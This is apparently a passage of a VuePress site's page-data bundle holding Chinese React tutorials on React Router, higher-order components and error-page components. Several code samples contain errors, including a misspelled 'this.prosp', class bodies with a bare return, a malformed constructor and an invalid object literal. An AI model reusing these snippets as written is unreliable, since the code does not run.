commonjs 或 es6 的模块管理器，例如 webpack：\n\n# cjs\nconst reactrouter = require(\"react-router-dom\")\nconst {browserrouter,route,link} = reactrouter;\n\n# es6\nimport {\n  browserrouter,\n  hashrouter,\n  route,\n  link,\n  navlink\n} from 'react-router-dom'\n",charsets:{cjk:!0}},{title:"十二、编程式路由导航",frontmatter:{},regularPath:"/React/React%E8%B7%AF%E7%94%B1/07-%E7%BC%96%E7%A8%8B%E5%BC%8F%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%88%AA.html",relativePath:"React/React路由/07-编程式路由导航.md",key:"v-64862be0",path:"/React/React%E8%B7%AF%E7%94%B1/07-%E7%BC%96%E7%A8%8B%E5%BC%8F%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%88%AA.html",headers:[{level:2,title:"十二、编程式路由导航",slug:"十二、编程式路由导航",normalizedTitle:"十二、编程式路由导航",charIndex:2},{level:2,title:"十三、BrowserRouter与HashRouter的区别",slug:"十三、browserrouter与hashrouter的区别",normalizedTitle:"十三、browserrouter与hashrouter的区别",charIndex:213}],headersStr:"十二、编程式路由导航 十三、BrowserRouter与HashRouter的区别",content:"# 十二、编程式路由导航\n\n借助this.prosp.history对象上的API对操作路由跳转、前进、后退\n\n * this.prosp.history.push()\n * this.prosp.history.replace()\n * this.prosp.history.goBack()\n * this.prosp.history.goForward()\n * this.prosp.history.go()\n\n\n# 十三、BrowserRouter与HashRouter的区别\n\n> 1.底层原理不一样： - BrowserRouter使用的是H5的history API，不兼容IE9及以下版本。 - HashRouter使用的是URL的哈希值。 2.path表现形式不一样 - BrowserRouter的路径中没有#,例如：localhost:3000/demo/test - HashRouter的路径包含#,例如：localhost:3000/#/demo/test 3.刷新后对路由state参数的影响 - (1).BrowserRouter没有任何影响，因为state保存在history对象中。 - (2).HashRouter刷新后会导致路由state参数的丢失！！！ 4.备注：HashRouter可以用于解决一些路径错误相关的问题。",normalizedContent:"# 十二、编程式路由导航\n\n借助this.prosp.history对象上的api对操作路由跳转、前进、后退\n\n * this.prosp.history.push()\n * this.prosp.history.replace()\n * this.prosp.history.goback()\n * this.prosp.history.goforward()\n * this.prosp.history.go()\n\n\n# 十三、browserrouter与hashrouter的区别\n\n> 1.底层原理不一样： - browserrouter使用的是h5的history api，不兼容ie9及以下版本。 - hashrouter使用的是url的哈希值。 2.path表现形式不一样 - browserrouter的路径中没有#,例如：localhost:3000/demo/test - hashrouter的路径包含#,例如：localhost:3000/#/demo/test 3.刷新后对路由state参数的影响 - (1).browserrouter没有任何影响，因为state保存在history对象中。 - (2).hashrouter刷新后会导致路由state参数的丢失！！！ 4.备注：hashrouter可以用于解决一些路径错误相关的问题。",charsets:{cjk:!0}},{title:"ReactRouter项目案例",frontmatter:{},regularPath:"/React/React%E8%B7%AF%E7%94%B1/06-ReactRouter%E9%A1%B9%E7%9B%AE%E6%A1%88%E4%BE%8B.html",relativePath:"React/React路由/06-ReactRouter项目案例.md",key:"v-15996d3c",path:"/React/React%E8%B7%AF%E7%94%B1/06-ReactRouter%E9%A1%B9%E7%9B%AE%E6%A1%88%E4%BE%8B.html",headersStr:null,content:"# ReactRouter项目案例\n\n在目录 src/route.js 定义路由：\n\n//导入页面\nimport { Login, Main, Dashboard, ExamOnline, ExamMine, System, Password, Personal, NotFound } from \"pages\";\n\n//定义路由\nexport default [\n\t{\n\t\tpath: '/',\n\t\texact: true,\n\t\tcomponent: Login\n\t},\n\t{\n\t\tpath: '/main',\n\t\tcomponent: Main,\n\t\tchildren: [\n\t\t\t{\n\t\t\t\tpath: '/main/',\n\t\t\t\texact: true,\n\t\t\t\tcomponent: Dashboard,\n\t\t\t\tmeta: {\n\t\t\t\t\ticon: 'icon-dashboard2',\n\t\t\t\t\ttitle: '仪表盘',\n\t\t\t\t\tvisible: true\n\t\t\t\t}\n\t\t\t},\n\t\t\t{\n\t\t\t\tpath: '/main/examonline',\n\t\t\t\tcomponent: ExamOnline,\n\t\t\t\tmeta: {\n\t\t\t\t\ticon: 'icon-icon-kaoshijilu',\n\t\t\t\t\ttitle: '在线考试',\n\t\t\t\t\tvisible: true\n\t\t\t\t}\n\t\t\t},\n\t\t\t{\n\t\t\t\tpath: '/main/exammine',\n\t\t\t\tcomponent: ExamMine,\n\t\t\t\tmeta: {\n\t\t\t\t\ticon: 'icon-bishi',\n\t\t\t\t\ttitle: '我的考试',\n\t\t\t\t\tvisible: true\n\t\t\t\t}\n\t\t\t},\n\t\t\t{\n\t\t\t\tpath: '/main/system',\n\t\t\t\tcomponent: System,\n\t\t\t\tmeta: {\n\t\t\t\t\ticon: 'icon-weixiu',\n\t\t\t\t\ttitle: '系统设置',\n\t\t\t\t\tvisible: true\n\t\t\t\t},\n\t\t\t\tchildren: [\n\t\t\t\t\t{\n\t\t\t\t\t\tpath: '/main/system/password',\n\t\t\t\t\t\tcomponent: Password,\n\t\t\t\t\t\tmeta: {\n\t\t\t\t\t\t\ticon: 'icon-yuan',\n\t\t\t\t\t\t\ttitle: '修改密码'\n\t\t\t\t\t\t}\n\t\t\t\t\t},\n\t\t\t\t\t{\n\t\t\t\t\t\tpath: '/main/system/personal',\n\t\t\t\t\t\tcomponent: Personal,\n\t\t\t\t\t\tmeta: {\n\t\t\t\t\t\t\ticon: 'icon-yuan',\n\t\t\t\t\t\t\ttitle: '个人信息'\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t]\n\t\t\t},\n\t\t\t{\n\t\t\t\tcomponent: NotFound,\n\t\t\t\tmeta: { visible: false }\n\t\t\t}\n\t\t]\n\t},\n\t{\n\t\tcomponent: NotFound\n\t}\n]\n\n\n在src/index.js入口页面：\n\nimport { BrowserRouter as Router } from \"react-router-dom\";\nimport App from './App';\n\nReactDOM.render(\n\t<Router>\n\t\t<App />\n\t</Router>\n\t, document.getElementById('root')\n);\n\n\n在src/App.js下遍历路由：\n\nimport React, { Component } from 'react';\n// Switch 匹配唯一路由\nimport { Route, Switch } from \"react-router-dom\";\n// AuthRoute 页面登录权限验证\nimport { AuthRoute } from \"components\"\nimport routes from \"./route\";\n\nimport \"./assets/css/index.scss\";\nclass App extends Component {\n\trender() {\n\t\treturn (\n\t\t\t<div className=\"App\">\n\t\t\t\t<Switch>\n\t\t\t\t\t{routes.map(v => {\n\t\t\t\t\t\tif (v.path) {\n\t\t\t\t\t\t\treturn v.path === '/' ? <Route path={v.path} exact={v.exact ? true : false} component={v.component} key={v.path} /> : <AuthRoute path={v.path} exact={v.exact ? true : false} component={v.component} key={v.path} />\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\treturn <Route component={v.component} key={'NotFound'} />\n\t\t\t\t\t\t}\n\t\t\t\t\t})}\n\t\t\t\t</Switch>\n\t\t\t</div>\n\t\t);\n\t}\n}\n\nexport default App;\n",normalizedContent:"# reactrouter项目案例\n\n在目录 src/route.js 定义路由：\n\n//导入页面\nimport { login, main, dashboard, examonline, exammine, system, password, personal, notfound } from \"pages\";\n\n//定义路由\nexport default [\n\t{\n\t\tpath: '/',\n\t\texact: true,\n\t\tcomponent: login\n\t},\n\t{\n\t\tpath: '/main',\n\t\tcomponent: main,\n\t\tchildren: [\n\t\t\t{\n\t\t\t\tpath: '/main/',\n\t\t\t\texact: true,\n\t\t\t\tcomponent: dashboard,\n\t\t\t\tmeta: {\n\t\t\t\t\ticon: 'icon-dashboard2',\n\t\t\t\t\ttitle: '仪表盘',\n\t\t\t\t\tvisible: true\n\t\t\t\t}\n\t\t\t},\n\t\t\t{\n\t\t\t\tpath: '/main/examonline',\n\t\t\t\tcomponent: examonline,\n\t\t\t\tmeta: {\n\t\t\t\t\ticon: 'icon-icon-kaoshijilu',\n\t\t\t\t\ttitle: '在线考试',\n\t\t\t\t\tvisible: true\n\t\t\t\t}\n\t\t\t},\n\t\t\t{\n\t\t\t\tpath: '/main/exammine',\n\t\t\t\tcomponent: exammine,\n\t\t\t\tmeta: {\n\t\t\t\t\ticon: 'icon-bishi',\n\t\t\t\t\ttitle: '我的考试',\n\t\t\t\t\tvisible: true\n\t\t\t\t}\n\t\t\t},\n\t\t\t{\n\t\t\t\tpath: '/main/system',\n\t\t\t\tcomponent: system,\n\t\t\t\tmeta: {\n\t\t\t\t\ticon: 'icon-weixiu',\n\t\t\t\t\ttitle: '系统设置',\n\t\t\t\t\tvisible: true\n\t\t\t\t},\n\t\t\t\tchildren: [\n\t\t\t\t\t{\n\t\t\t\t\t\tpath: '/main/system/password',\n\t\t\t\t\t\tcomponent: password,\n\t\t\t\t\t\tmeta: {\n\t\t\t\t\t\t\ticon: 'icon-yuan',\n\t\t\t\t\t\t\ttitle: '修改密码'\n\t\t\t\t\t\t}\n\t\t\t\t\t},\n\t\t\t\t\t{\n\t\t\t\t\t\tpath: '/main/system/personal',\n\t\t\t\t\t\tcomponent: personal,\n\t\t\t\t\t\tmeta: {\n\t\t\t\t\t\t\ticon: 'icon-yuan',\n\t\t\t\t\t\t\ttitle: '个人信息'\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t]\n\t\t\t},\n\t\t\t{\n\t\t\t\tcomponent: notfound,\n\t\t\t\tmeta: { visible: false }\n\t\t\t}\n\t\t]\n\t},\n\t{\n\t\tcomponent: notfound\n\t}\n]\n\n\n在src/index.js入口页面：\n\nimport { browserrouter as router } from \"react-router-dom\";\nimport app from './app';\n\nreactdom.render(\n\t<router>\n\t\t<app />\n\t</router>\n\t, document.getelementbyid('root')\n);\n\n\n在src/app.js下遍历路由：\n\nimport react, { component } from 'react';\n// switch 匹配唯一路由\nimport { route, switch } from \"react-router-dom\";\n// authroute 页面登录权限验证\nimport { authroute } from \"components\"\nimport routes from \"./route\";\n\nimport \"./assets/css/index.scss\";\nclass app extends component {\n\trender() {\n\t\treturn (\n\t\t\t<div classname=\"app\">\n\t\t\t\t<switch>\n\t\t\t\t\t{routes.map(v => {\n\t\t\t\t\t\tif (v.path) {\n\t\t\t\t\t\t\treturn v.path === '/' ? <route path={v.path} exact={v.exact ? true : false} component={v.component} key={v.path} /> : <authroute path={v.path} exact={v.exact ? true : false} component={v.component} key={v.path} />\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\treturn <route component={v.component} key={'notfound'} />\n\t\t\t\t\t\t}\n\t\t\t\t\t})}\n\t\t\t\t</switch>\n\t\t\t</div>\n\t\t);\n\t}\n}\n\nexport default app;\n",charsets:{cjk:!0}},{title:"ReactRouter问题",frontmatter:{},regularPath:"/React/React%E8%B7%AF%E7%94%B1/08-ReactRouter%E9%97%AE%E9%A2%98.html",relativePath:"React/React路由/08-ReactRouter问题.md",key:"v-74ca3e4b",path:"/React/React%E8%B7%AF%E7%94%B1/08-ReactRouter%E9%97%AE%E9%A2%98.html",headers:[{level:3,title:"路由变了页面没变",slug:"路由变了页面没变",normalizedTitle:"路由变了页面没变",charIndex:20}],headersStr:"路由变了页面没变",content:"# ReactRouter问题\n\n\n# 路由变了页面没变\n\n错误的地方就在类似这样的代码\n\n写法1\n\nexport default connect(mapStateToProp, mapDispatchToProp)(withRouter(AppContainer));\n\n\n应该写成\n\n写法2\n\nexport default withRouter(connect(mapStateToProp, mapDispatchToProp)(AppContainer));\n\n\n原因 connect内是进行shallow comparison浅比较的。它重写了组件的shouldComponentUpdate方法\n\n写法1中，connect重写了withRouter的shouldComponentUpdate方法，导致其不能够响应location的变化（仅仅响应mapStateToProps里面的变化）\n\n写法2中，将withRouter提到外层，withRouter的shouldComponentUpdate不会被重写，就会响应location的变化",normalizedContent:"# reactrouter问题\n\n\n# 路由变了页面没变\n\n错误的地方就在类似这样的代码\n\n写法1\n\nexport default connect(mapstatetoprop, mapdispatchtoprop)(withrouter(appcontainer));\n\n\n应该写成\n\n写法2\n\nexport default withrouter(connect(mapstatetoprop, mapdispatchtoprop)(appcontainer));\n\n\n原因 connect内是进行shallow comparison浅比较的。它重写了组件的shouldcomponentupdate方法\n\n写法1中，connect重写了withrouter的shouldcomponentupdate方法，导致其不能够响应location的变化（仅仅响应mapstatetoprops里面的变化）\n\n写法2中，将withrouter提到外层，withrouter的shouldcomponentupdate不会被重写，就会响应location的变化",charsets:{cjk:!0}},{title:"高阶组件",frontmatter:{},regularPath:"/React/React%E9%A1%B9%E7%9B%AE/01-%E9%AB%98%E9%98%B6%E7%BB%84%E4%BB%B6.html",relativePath:"React/React项目/01-高阶组件.md",key:"v-6a5a6af9",path:"/React/React%E9%A1%B9%E7%9B%AE/01-%E9%AB%98%E9%98%B6%E7%BB%84%E4%BB%B6.html",headers:[{level:2,title:"什么时候使用高阶组件？",slug:"什么时候使用高阶组件",normalizedTitle:"什么时候使用高阶组件？",charIndex:577},{level:2,title:"高阶组件实现",slug:"高阶组件实现",normalizedTitle:"高阶组件实现",charIndex:826},{level:3,title:"属性代理",slug:"属性代理",normalizedTitle:"属性代理",charIndex:855},{level:2,title:"HOC可以做什么？",slug:"hoc可以做什么",normalizedTitle:"hoc可以做什么？",charIndex:4640},{level:3,title:"代码复用",slug:"代码复用",normalizedTitle:"代码复用",charIndex:4654}],headersStr:"什么时候使用高阶组件？ 高阶组件实现 属性代理 HOC可以做什么？ 代码复用",content:"# 高阶组件\n\n> 高阶组件是重用组件逻辑的一项高级技术。\n\n高阶组件(HOC全称Higher-order component)是一种React的进阶使用方法，主要还是为了便于组件的复用。\n\n高阶组件类似于高阶函数，接收 React 组件作为输入，输出一个新的 React 组件。高阶组件让代码更具有复用性、逻辑性与抽象特征。可以对 render 方法作劫持，也可以控制 props 与 state。\n\n> 通俗来讲高阶组件是一个函数，能够接受一个组件并返回一个高级的组件。\n\nvar newComponent = higherOrderComponent(oldComponent);\n\n\n最简单的HOC实现是这个样子的：\n\n//定义高阶组件\nfunction HOCFactory (WrappedComponent){\n    //返回一个中间组件，在其中可包含复用逻辑\n    return class extends Component{\n        return <WrappedComponent {...this.props}/>\n    }\n}\n\nclass MyComponent extends Component{}\n\n//创建高阶组件\nexport default HOCFactory(MyComponent)\n\n\n\n# 什么时候使用高阶组件？\n\n在React开发过程中，发现有很多情况下，组件需要被\"增强\"，比如说给组件添加或者修改一些特定的props，一些权限的管理，或者一些其他的优化之类的。而如果这个功能是针对多个组件的，同时每一个组件都写一套相同的代码，明显显得不是很明智，所以就可以考虑使用高阶组件。\n\nHOC:\n\n> 例如：react-redux的connect方法就是一个HOC，他获取wrappedComponent，在connect中给wrappedComponent添加需要的props。\n\n\n# 高阶组件实现\n\n实现高阶组件的方法有如下两种。\n\n 1. 属性代理(props proxy)。属性组件通过被包裹的 React 组件来操作 props。\n\n * 反向代理(inheritance inversion)。高阶组件继承于被包裹的 React 组件。\n\n\n# 属性代理\n\n属性代理是常见高阶组件的实现方法。\n\nconst MyContainer = (WrappedComponent) => {\n    return class extends Component {\n        //可复用逻辑\n        render() {\n            return (\n                <WrappedComponent\n                    {...props}\n                />\n            )\n        }\n    }\n}\n\nexport default MyContainer;\n\n\n原始组件想要具备高阶组件对它的修饰，有这样两种方式：\n\n# 方式一：传统方式\n\nexport default function HOCFactory (WrappedComponent){\n    return class extends Component{\n        return <WrappedComponent {...this.props}/>\n    }\n}\n\nclass MyComponent extends Component{}\n\nexport default HOCFactory(MyComponent)\n\n\n# 方式二：ES7 decorator(装饰器)\n\nES7 添加了 decorator 的属性，我们可以通过 decorator 来转换，以此简化高阶组件的调用。\n\nexport default function HOCFactory (WrappedComponent){\n    return class extends Component{\n        return <WrappedComponent {...this.props}/>\n    }\n}\n\n@HOCFactory\nclass MyComponent extends Component{}\n\nexport default MyComponent;\n\n\n生命周期\n\nHOC didmount -> (WrappedComponent didmount) -> (WrappedComponent will unmount) -> Hoc will unmount\n\n\n# 作用\n\n高阶组件可以控制 props、通过 refs 使用引用、抽象 state 和使用其他元素包裹 WrappedComponent。\n\n# 控制 props\n\n我们可以读取、增加、编辑或是移除从 WrappedComponent 传进来的 props，但需要小心删除与编辑重要的 props。应该尽量对高阶组件的 props 作新的命名以防止混淆。\n\nconst myContainer = (WrappedComponent)=>{\n    return class extends React.Component{\n        render(){\n            const newProps = {\n                ...this.props,\n                text: nextText\n            }\n            return (<WrappedComponent\n                {...this.props}\n            />)\n        }\n    }\n}\nexport default myContainer;\n\n\n当调用该高阶组件时，就可以使用 text 这个新的 props了。\n\n# 通过 refs 使用引用\n\n在高阶组件中，可以接受 refs 使用 WrappedComponent 的引用。\n\n//子组件\nclass Child extends React.Component{\n  render(){\n    return <input />\n  }\n}\n\n//高阶组件\nfunction logProps(WrappedComponent) {\n  class LogProps extends React.Component {\n    render() {\n        const {forwardedRef, ...rest} = this.props;\n        return <WrappedComponent ref={forwardedRef} {...rest} />;\n    }\n  }\n\n  return React.forwardRef((props, ref) => {\n    return <LogProps {...props} forwardedRef={ref} />;\n  });\n}\n\n//通过logProps 生成一个新组件\nconst logProps=logProps(Child);\n\n\nclass Father extends React.Component{\n  constructor(props){\n    super(props);\n    this.myRef=React.createRef();\n  }\n  componentDidMount(){\n    console.log(this.myRef.current); // 输出为 child\n  }\n  render(){\n    return <LogProps ref={this.myRef}/>\n  }\n}\n\n\n# 抽象 state\n\n可以通过 WrappedComponent 提供的 props 和回调函数抽象 state。将原组件抽象为展示型组件，分离内部状态 。\n\nconst MyContainer = (WrappedComponent) => {\n    return class extends Component {\n        constructor(props);\n            super(props);\n            this.state = {\n                name: ''\n            };\n        }\n\n        onNameChange(text) {\n            this.setState({\n                name: text\n            });\n        }\n\n        render() {\n            const newProps =  {\n                name = {\n                    value: this.state.name,\n                    onChangeText: this.onNameChange\n                }\n            }\n            return (\n                <WrappedComponent\n                    {...this.props}\n                    {...newProps}\n                />\n            );\n        }\n}\n\nexport default MyContainer;\n\n\n使用\n\n@MyContainer\nclass MyComponent extends Component {\n    render() {\n        return (\n            <TextInput\n                {...this.props.name}\n            />\n        );\n    }\n}\n\n\n# 使用其他元素包裹 WrappedComponent\n\n可以使用其他元素包裹 WrappedComponent。\n\nconst MyContainer = (WrappedComponent) => {\n    return class extends Component {\n        render() {\n            return (\n                <View>\n                    <WrappedComponent />\n                </View>\n            );\n        }\n    }\n}\n\nexport default MyContainer;\n\n\n\n# HOC可以做什么？\n\n * 代码复用，代码模块化\n * 增删改props\n * 渲染劫持\n\n其实，除了代码复用和模块化，HOC做的其实就是劫持，由于传入的wrappedComponent是作为一个child进行渲染的，上级传入的props都是直接传给HOC的，所以HOC组件拥有很大的权限去修改props和控制渲染。\n\n\n# 代码复用\n\n例如：组件A的代码 与组件B的代码 部分逻辑相同，针对这种情况，我们可以采用高阶组件去复用这部分逻辑。\n\nhttps://segmentfault.com/a/1190000008112017\n\nhttps://juejin.im/post/5bd68bc5518825287847a860",normalizedContent:"# 高阶组件\n\n> 高阶组件是重用组件逻辑的一项高级技术。\n\n高阶组件(hoc全称higher-order component)是一种react的进阶使用方法，主要还是为了便于组件的复用。\n\n高阶组件类似于高阶函数，接收 react 组件作为输入，输出一个新的 react 组件。高阶组件让代码更具有复用性、逻辑性与抽象特征。可以对 render 方法作劫持，也可以控制 props 与 state。\n\n> 通俗来讲高阶组件是一个函数，能够接受一个组件并返回一个高级的组件。\n\nvar newcomponent = higherordercomponent(oldcomponent);\n\n\n最简单的hoc实现是这个样子的：\n\n//定义高阶组件\nfunction hocfactory (wrappedcomponent){\n    //返回一个中间组件，在其中可包含复用逻辑\n    return class extends component{\n        return <wrappedcomponent {...this.props}/>\n    }\n}\n\nclass mycomponent extends component{}\n\n//创建高阶组件\nexport default hocfactory(mycomponent)\n\n\n\n# 什么时候使用高阶组件？\n\n在react开发过程中，发现有很多情况下，组件需要被\"增强\"，比如说给组件添加或者修改一些特定的props，一些权限的管理，或者一些其他的优化之类的。而如果这个功能是针对多个组件的，同时每一个组件都写一套相同的代码，明显显得不是很明智，所以就可以考虑使用高阶组件。\n\nhoc:\n\n> 例如：react-redux的connect方法就是一个hoc，他获取wrappedcomponent，在connect中给wrappedcomponent添加需要的props。\n\n\n# 高阶组件实现\n\n实现高阶组件的方法有如下两种。\n\n 1. 属性代理(props proxy)。属性组件通过被包裹的 react 组件来操作 props。\n\n * 反向代理(inheritance inversion)。高阶组件继承于被包裹的 react 组件。\n\n\n# 属性代理\n\n属性代理是常见高阶组件的实现方法。\n\nconst mycontainer = (wrappedcomponent) => {\n    return class extends component {\n        //可复用逻辑\n        render() {\n            return (\n                <wrappedcomponent\n                    {...props}\n                />\n            )\n        }\n    }\n}\n\nexport default mycontainer;\n\n\n原始组件想要具备高阶组件对它的修饰，有这样两种方式：\n\n# 方式一：传统方式\n\nexport default function hocfactory (wrappedcomponent){\n    return class extends component{\n        return <wrappedcomponent {...this.props}/>\n    }\n}\n\nclass mycomponent extends component{}\n\nexport default hocfactory(mycomponent)\n\n\n# 方式二：es7 decorator(装饰器)\n\nes7 添加了 decorator 的属性，我们可以通过 decorator 来转换，以此简化高阶组件的调用。\n\nexport default function hocfactory (wrappedcomponent){\n    return class extends component{\n        return <wrappedcomponent {...this.props}/>\n    }\n}\n\n@hocfactory\nclass mycomponent extends component{}\n\nexport default mycomponent;\n\n\n生命周期\n\nhoc didmount -> (wrappedcomponent didmount) -> (wrappedcomponent will unmount) -> hoc will unmount\n\n\n# 作用\n\n高阶组件可以控制 props、通过 refs 使用引用、抽象 state 和使用其他元素包裹 wrappedcomponent。\n\n# 控制 props\n\n我们可以读取、增加、编辑或是移除从 wrappedcomponent 传进来的 props，但需要小心删除与编辑重要的 props。应该尽量对高阶组件的 props 作新的命名以防止混淆。\n\nconst mycontainer = (wrappedcomponent)=>{\n    return class extends react.component{\n        render(){\n            const newprops = {\n                ...this.props,\n                text: nexttext\n            }\n            return (<wrappedcomponent\n                {...this.props}\n            />)\n        }\n    }\n}\nexport default mycontainer;\n\n\n当调用该高阶组件时，就可以使用 text 这个新的 props了。\n\n# 通过 refs 使用引用\n\n在高阶组件中，可以接受 refs 使用 wrappedcomponent 的引用。\n\n//子组件\nclass child extends react.component{\n  render(){\n    return <input />\n  }\n}\n\n//高阶组件\nfunction logprops(wrappedcomponent) {\n  class logprops extends react.component {\n    render() {\n        const {forwardedref, ...rest} = this.props;\n        return <wrappedcomponent ref={forwardedref} {...rest} />;\n    }\n  }\n\n  return react.forwardref((props, ref) => {\n    return <logprops {...props} forwardedref={ref} />;\n  });\n}\n\n//通过logprops 生成一个新组件\nconst logprops=logprops(child);\n\n\nclass father extends react.component{\n  constructor(props){\n    super(props);\n    this.myref=react.createref();\n  }\n  componentdidmount(){\n    console.log(this.myref.current); // 输出为 child\n  }\n  render(){\n    return <logprops ref={this.myref}/>\n  }\n}\n\n\n# 抽象 state\n\n可以通过 wrappedcomponent 提供的 props 和回调函数抽象 state。将原组件抽象为展示型组件，分离内部状态 。\n\nconst mycontainer = (wrappedcomponent) => {\n    return class extends component {\n        constructor(props);\n            super(props);\n            this.state = {\n                name: ''\n            };\n        }\n\n        onnamechange(text) {\n            this.setstate({\n                name: text\n            });\n        }\n\n        render() {\n            const newprops =  {\n                name = {\n                    value: this.state.name,\n                    onchangetext: this.onnamechange\n                }\n            }\n            return (\n                <wrappedcomponent\n                    {...this.props}\n                    {...newprops}\n                />\n            );\n        }\n}\n\nexport default mycontainer;\n\n\n使用\n\n@mycontainer\nclass mycomponent extends component {\n    render() {\n        return (\n            <textinput\n                {...this.props.name}\n            />\n        );\n    }\n}\n\n\n# 使用其他元素包裹 wrappedcomponent\n\n可以使用其他元素包裹 wrappedcomponent。\n\nconst mycontainer = (wrappedcomponent) => {\n    return class extends component {\n        render() {\n            return (\n                <view>\n                    <wrappedcomponent />\n                </view>\n            );\n        }\n    }\n}\n\nexport default mycontainer;\n\n\n\n# hoc可以做什么？\n\n * 代码复用，代码模块化\n * 增删改props\n * 渲染劫持\n\n其实，除了代码复用和模块化，hoc做的其实就是劫持，由于传入的wrappedcomponent是作为一个child进行渲染的，上级传入的props都是直接传给hoc的，所以hoc组件拥有很大的权限去修改props和控制渲染。\n\n\n# 代码复用\n\n例如：组件a的代码 与组件b的代码 部分逻辑相同，针对这种情况，我们可以采用高阶组件去复用这部分逻辑。\n\nhttps://segmentfault.com/a/1190000008112017\n\nhttps://juejin.im/post/5bd68bc5518825287847a860",charsets:{cjk:!0}},{title:"React错误处理",frontmatter:{},regularPath:"/React/React%E9%A1%B9%E7%9B%AE/03-React%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86.html",relativePath:"React/React项目/03-React错误处理.md",key:"v-345a822e",path:"/React/React%E9%A1%B9%E7%9B%AE/03-React%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86.html",headers:[{level:2,title:"页面级报错",slug:"页面级报错",normalizedTitle:"页面级报错",charIndex:91},{level:3,title:"应用场景",slug:"应用场景",normalizedTitle:"应用场景",charIndex:101},{level:3,title:"实现",slug:"实现",normalizedTitle:"实现",charIndex:211},{level:2,title:"提示性报错",slug:"提示性报错",normalizedTitle:"提示性报错",charIndex:844},{level:3,title:"应用场景",slug:"应用场景-2",normalizedTitle:"应用场景",charIndex:101},{level:3,title:"实现",slug:"实现-2",normalizedTitle:"实现",charIndex:211}],headersStr:"页面级报错 应用场景 实现 提示性报错 应用场景 实现",content:'# React错误处理\n\n在用户使用过程中，可能遇到各种异常情况，比如页面404，申请结果失败，请求的返回异常等等，这篇文档会按照报错形式的不同，分别介绍下相应的处理建议。\n\n\n# 页面级报错\n\n\n# 应用场景\n\n * 路由直接引导到错误页面，比如你输入的网址没有匹配到任何页面，可以由路由引导到预设的 404 页面。\n * 代码控制跳转到报错页面，比如根据请求返回的数据，将没有权限的用户引导到 403 页面。\n\n\n# 实现\n\n针对页面级的报错：\n\nclass Exception extends React.Component{\n    static defaultProps = {\n        type:404\n    }\n    constructor(){\n        super();\n        this.state = {\n\n        }\n    }\n    render(){\n        //可自定义错误信息\n        if(this.props.type >= 404 && this.props.type < 422){\n            return <div>404,页面未找到</div>\n        }else if(this.props.type == 403 ){\n            return <div>403,没有访问权限</div>\n        }else if(this.props.type <= 504 && this.props.type >= 500){\n            return <div>500,服务器错误</div>\n        }\n    }\n}\n\n\n<Exception/>             //404错误\n<Exception type="403"/>  //403错误\n<Exception type="500"/>  //500错误\n\n\n\n# 提示性报错\n\n\n# 应用场景\n\n * 表单项校验报错。\n * 操作反馈。\n * 网络请求错误。\n\n\n# 实现\n\n提示性错误一般情况下，我们需要定义 提示组件 给与响应提示即可。\n\n# Alert 警告提示\n\n警告提示，展现需要关注的信息。非浮层的静态展现形式，始终展现，不会自动消失，用户可以点击关闭。\n\nclass Alert  extends React.Component{}\n\n\n# Message 全局提示\n\n可提供成功、警告和错误等反馈信息。顶部居中显示并自动消失，是一种不打断用户操作的轻量级提示方式。\n\nclass Message  extends React.Component{}\n\n\n# Notification 通知提醒框\n\n全局展示通知提醒信息。在系统四个角显示通知提醒信息。经常用于以下情况：\n\n * 较为复杂的通知内容。\n * 带有交互的通知，给出用户下一步的行动点。\n * 系统主动推送。\n\nclass Notification extends React.Component{}\n',normalizedContent:'# react错误处理\n\n在用户使用过程中，可能遇到各种异常情况，比如页面404，申请结果失败，请求的返回异常等等，这篇文档会按照报错形式的不同，分别介绍下相应的处理建议。\n\n\n# 页面级报错\n\n\n# 应用场景\n\n * 路由直接引导到错误页面，比如你输入的网址没有匹配到任何页面，可以由路由引导到预设的 404 页面。\n * 代码控制跳转到报错页面，比如根据请求返回的数据，将没有权限的用户引导到 403 页面。\n\n\n# 实现\n\n针对页面级的报错：\n\nclass exception extends react.component{\n    static defaultprops = {\n        type:404\n    }\n    constructor(){\n        super();\n        this.state = {\n\n        }\n    }\n    render(){\n        //可自定义错误信息\n        if(this.props.type >= 404 && this.props.type < 422){\n            return <div>404,页面未找到</div>\n        }else if(this.props.type == 403 ){\n            return <div>403,没有访问权限</div>\n        }else if(this.props.type <= 504 && this.props.type >= 500){\n            return <div>500,服务器错误</div>\n        }\n    }\n}\n\n\n<exception/>             //404错误\n<exception type="403"/>  //403错误\n<exception type="500"/>  //500错误\n\n\n\n# 提示性报错\n\n\n# 应用场景\n\n * 表单项校验报错。\n * 操作反馈。\n * 网络请求错误。\n\n\n# 实现\n\n提示性错误一般情况下，我们需要定义 提示组件 给与响应提示即可。\n\n# alert 警告提示\n\n警告提示，展现需要关注的信息。非浮层的静态展现形式，始终展现，不会自动消失，用户可以点击关闭。\n\nclass alert  extends react.component{}\n\n\n# message 全局提示\n\n可提供成功、警告和错误等反馈信息。顶部居中显示并自动消失，是一种不打断用户操作的轻量级提示方式。\n\nclass message  extends react.component{}\n\n\n# notification 通知提醒框\n\n全局展示通知提醒信息。在系统四个角显示通知提醒信息。经常用于以下情况：\n\n * 较为复杂的通知内容。\n * 带有交互的通知，给出用户下一步的行动点。\n * 系统主动推送。\n\nclass notification extends react.component{}\n',charsets:{cjk:!0}},{title:"React项目环境搭建",frontmatter:{},regularPath:"/React/React%E9%A1%B9%E7%9B%AE/05-React%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",relativePath:"React/React项目/05-React项目环境搭建.md",key:"v-3f1af7ad",path:"/React/React%E9%A1%B9%E7%9B%AE/05-React%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",headers:[{level:2,title:"从零搭建开发环境基本步骤",slug:"从零搭建开发环境基本步骤",normalizedTitle:"从零搭建开发环境基本步骤",charIndex:165},{level:3,title:"建立项目文件夹",slug:"建立项目文件夹",normalizedTitle:"建立项目文件夹",charIndex:182},{level:3,title:"npm init 项目初始化",slug:"npm-init-项目初始化",normalizedTitle:"npm init 